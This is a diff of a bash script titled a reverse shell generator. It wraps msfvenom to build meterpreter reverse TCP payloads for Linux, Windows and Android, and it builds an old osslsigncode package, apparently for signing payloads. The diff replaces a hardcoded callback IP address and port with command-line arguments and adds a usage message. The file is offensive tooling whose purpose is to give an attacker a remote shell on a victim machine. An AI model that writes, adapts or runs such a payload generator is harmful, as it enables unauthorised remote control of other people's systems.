@@ -1,10 +1,6 @@
 #!/bin/bash
 # Reverse shell generator
-LHOST="194.164.196.175"
-LPORT="420"
-if ! command -v msfvenom &> /dev/null ; then
-    yay metasploit
-fi
+need metasploit
 installopensslold() {
 cat <<EOF > PKGBUILD
 pkgname="osslsigncode"
@@ -44,8 +40,10 @@ EOF
 sudo makepkg -si --noconfirm
 rm -rf PKGBUILD
 }
-if [[ $1 == "-h" ]]; then 
-    echo -e "Options>\n linux\n windows\n android"
+LHOST="$2"
+LPORT="$3"
+if [[ -z $3 ]]; then 
+    echo -e "Usage: revshellgen [option] <ip> <port>\n Options>\n linux\n windows\n android"
     exit
 elif [[ $1 == "linux" ]]; then
     msfvenom -p python/meterpreter_reverse_tcp LHOST="$LHOST" LPORT="$LPORT" MeterpreterTryToFork=false -o shell
